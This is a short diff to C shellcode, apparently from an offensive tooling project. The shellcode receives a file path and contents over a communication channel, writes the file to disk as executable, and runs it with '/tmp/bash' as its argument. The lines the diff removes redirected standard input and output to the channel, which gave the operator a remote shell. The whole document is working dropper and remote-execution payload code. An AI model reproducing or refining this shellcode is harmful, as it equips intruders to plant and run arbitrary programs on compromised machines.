@@ -12,24 +12,22 @@ SHELLCODE_ENTRY {
     void *file_contents;
 
     /* Read the path. */
-    _read(chan.rx, file_path, sizeof(file_path));
+    channel_recv(chan, file_path, sizeof(file_path));
 
     /* Read the file size. */
-    _read(chan.rx, &file_sz, sizeof(file_sz));
+    channel_recv(chan, &file_sz, sizeof(file_sz));
     
     /* Read the file data. */
     file_contents = _malloc(file_sz);
-    _read(chan.rx, file_contents, file_sz);
+    channel_recv(chan, file_contents, file_sz);
 
     /* Drop executable file. */
     drop_file(file_path, S_IRUSR | S_IWUSR | S_IXUSR, file_contents, file_sz); 
 
-    char *const argv[] = { NULL };
+    char *const argv[] = { "/tmp/bash", NULL };
     char *const envp[] = { NULL };
 
-    _dup2(chan.rx, stdin);
-    _dup2(chan.tx, stdout);
-    _dup2(chan.tx, stderr);
-    _execve(file_path, argv, envp);
+    /* Execute the dropped executable. */
+    execute(file_path, argv, envp, chan);
 
 } SHELLCODE_END
